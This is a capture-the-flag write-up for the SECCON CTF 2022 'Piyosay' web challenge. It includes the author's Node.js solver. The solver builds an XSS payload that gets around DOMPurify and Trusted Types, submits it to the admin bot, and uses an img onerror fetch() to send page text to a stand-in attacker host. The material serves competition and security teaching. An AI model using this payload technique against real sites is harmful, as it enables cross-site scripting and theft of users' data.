---
title: "Piyosay - SECCON CTF 2022 Quals"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "piyosay", "web", "seccon-ctf-2022-quals"]
summary: "I know the combination of DOMPurify and Trusted Types is a perfect defense for XSS attacks."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/piyosay"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Quals"
  year: 2022
  challenge: "Piyosay"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/piyosay>
- **CTF:** SECCON CTF 2022 Quals

---

# [web] piyosay

## Description

I know the combination of DOMPurify and Trusted Types is a perfect defense for XSS attacks.

- `http://piyosay.seccon.games:3000`

## Attachments

- [piyosay](files/piyosay)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_BASE_URL=http://localhost:3000 \
    -e ATTACK_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/piyosay/solver/index.js>

```javascript
const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
  const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
  const url = `http://web:3000/result?${new URLSearchParams({
    emoji,
    message,
  })}`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        url,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const text = req.query.text;

    // Print a flag
    console.log("S" + text);
    // -> SECCON{this_is_real_flag} SECCON{REDACTED}">

    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(1000);
      await exploit();

      await sleep(5000);
      console.log("Failed");
      process.exit(1);
    }
  );
};
start();
```
